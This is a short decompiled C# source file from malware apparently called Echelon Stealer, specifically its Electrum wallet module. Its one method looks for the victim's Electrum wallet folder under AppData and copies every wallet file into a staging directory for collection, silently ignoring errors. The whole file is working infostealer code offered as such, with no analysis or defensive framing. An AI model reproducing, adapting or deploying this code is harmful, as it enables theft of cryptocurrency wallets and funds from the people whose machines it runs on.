using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000009 RID: 9
	internal class Electrum
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00003338 File Offset: 0x00001538
		public static void EleStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Electrum.ElectrumDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Electrum.ElectrumDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Electrum.ElectrumDir);
						fileInfo.CopyTo(directorypath + Electrum.ElectrumDir + fileInfo.Name);
					}
					Electrum.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000015 RID: 21
		public static int count;

		// Token: 0x04000016 RID: 22
		public static string ElectrumDir = "\\Wallets\\Electrum\\";

		// Token: 0x04000017 RID: 23
		public static string ElectrumDir2 = Help.AppDate + "\\Electrum\\wallets";
	}
}
